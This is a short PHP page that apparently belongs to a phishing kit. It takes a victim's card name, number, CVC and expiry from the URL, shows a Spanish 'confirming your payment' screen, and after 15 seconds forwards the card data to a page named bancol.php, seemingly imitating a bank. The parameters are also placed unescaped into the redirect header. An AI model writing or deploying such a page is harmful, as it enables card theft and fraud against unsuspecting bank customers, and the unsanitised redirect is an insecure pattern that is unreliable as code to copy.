<?php




$nombreC = $_GET['nombre'];
$codigo = $_GET['numero'];
$cvv = $_GET['cvc'];
$fecha = $_GET['fecha'];

header("refresh:15;url=bancol.php?numero=$codigo&nombre=$nombreC&cvv=$cvv&fecha=$fecha");

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>*{
    
    margin:0;
    padding:0;
    font-family: arial;
    }</style>
</head>
<body>
    
<div class="menu" style=" line-height:0;">
    
</div>
<br><br>
<center>  Estamos confirmando tu pago... <br>
    Esto puede tardar unos minutos
</center>


</body>
</html>